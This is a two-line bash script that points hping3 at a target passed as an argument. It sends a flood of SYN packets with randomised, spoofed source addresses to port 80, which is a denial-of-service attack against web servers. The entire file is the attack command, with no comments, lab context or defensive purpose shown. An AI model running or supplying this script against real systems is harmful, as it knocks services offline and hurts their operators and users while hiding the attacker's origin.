#!/bin/bash
hping3 $1 --flood --rand-source -p 80 --syn -d 120 -w 64